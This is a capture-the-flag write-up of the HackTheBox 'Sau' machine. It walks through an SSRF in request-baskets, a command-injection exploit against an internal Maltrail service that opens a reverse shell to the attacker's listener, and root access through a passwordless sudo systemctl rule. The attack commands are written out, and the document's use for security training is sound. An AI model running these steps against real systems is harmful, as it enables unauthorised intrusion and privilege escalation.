# Sau

Linux · Easy

## Enumeration

Nmap Scan

```
nmap -sVC -p- 10.10.11.224 > sau.xml
```
![image](https://github.com/vsang181/Hackthebox/assets/28651683/c86f0873-5851-449b-9e95-a95ad9fc06a4)

Upon scanning, the following ports are identified:

- 22: SSH
- 80: Filtered
- 8338: Filtered
- 55555: Open TCP

A web page is detected on port 55555.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/f0e1b86b-7769-492a-93ab-b83b391577fc)

The webpage is powered by "request-baskets v1.2.1."

![image](https://github.com/vsang181/Hackthebox/assets/28651683/eb37339e-cf78-40b4-9ddb-15991b86ef1e)

A Google search reveals potential vulnerabilities for this version.

[request-baskets SSRF](https://notes.sjtu.edu.cn/s/MUUhEymt7#)

The system indicates that an SSRF (Server Side Request Forgery) vulnerability is present in this version. We can verify this by first creating a basket and then accessing its settings, which allow us to redirect any request made to the webpage.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/9cdf3a86-2990-424b-9608-8329ab54ec84)

Let's attempt to redirect our requests to port 80 on the IP, a port that appears to be accessible only internally.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/9a7f6e87-8871-43c3-8b42-358f24f429ee)

After conducting a quick Google search, we discovered that the "Mailtrail" version in use is vulnerable to "Unauthenticated OS Command Injection (RCE)." Moreover, an exploit for this vulnerability was found.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/5e2af3af-68c8-4fb2-a84c-691a8febf4fc)

[Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)

## Exlpoitation

First, let's modify the redirection:

![image](https://github.com/vsang181/Hackthebox/assets/28651683/2ef4fc42-de20-4cb9-bde7-ddded379818c)

Next, execute the exploit with a netcat listener running in the background.

```
python3 eploit.py 10.10.14.189 1234 http://10.10.11.224:55555/vh3itq8
```
This grants us a system shell under the username "puma."

![image](https://github.com/vsang181/Hackthebox/assets/28651683/77c45748-552e-46ec-baac-0501970760ba)

## Privilege Escalation

Executing the `sudo -l` command shows that the user 'puma' can run `/usr/bin/systemctl status trail.service` as root without requiring a password.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/975518eb-7ba0-4a77-8ca7-8e83306cbaaf)

First, let's elevate our shell using the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next, run the command (which can be executed as root without a password). 

We found the following link for our reference.

[systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

Using the subsequent method, we gain access to a root terminal.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/46072be4-76ba-45fe-92ce-7a196e9893ba)

This provides us with the root flag.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/14bbf2d0-b339-4e57-b6fb-ab5da907c2a7)

